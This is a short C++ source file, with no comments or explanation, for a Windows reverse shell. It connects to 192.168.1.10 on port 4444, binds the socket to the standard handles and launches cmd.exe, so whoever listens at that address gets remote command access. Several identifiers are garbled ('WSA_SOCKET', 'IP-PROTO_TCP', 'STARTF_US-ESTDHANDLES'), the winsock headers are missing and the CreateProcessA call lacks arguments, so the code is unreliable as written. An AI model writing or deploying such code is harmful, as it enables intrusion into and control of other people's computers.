#include <fstream>

#include <iostream>

int main(){

WSADATA wsaData;

SOCKET sock;

sockaddr_in target;

WSAStartup(MAKEWORD(2,2),&wsaData);

sock = WSA_SOCKET(AF_INET, SOCK_STREAM, IP-PROTO_TCP,nullptr,0,0);

target.sin_family = AF_INET;

target.sin_port = htons(4444);

target.sin_addr.s_addr = inet_addr("192.168.1.10");

connect(sock,(sockaddr*)&target,sizeof(target));

STARTUPINFOA si = { sizeof(si)};

PROCESS_INFORMATION
pi;

si.dwFlags = STARTF_US-
ESTDHANDLES;

si.hStdInput =
si.hStdOutput =
si.hStdError = (HANDLE)sock;

CreateProcessA(nullptr,(LPSTR)"cmd.exe",nullptr,
nullptr,&si,&pi);

return 0;

}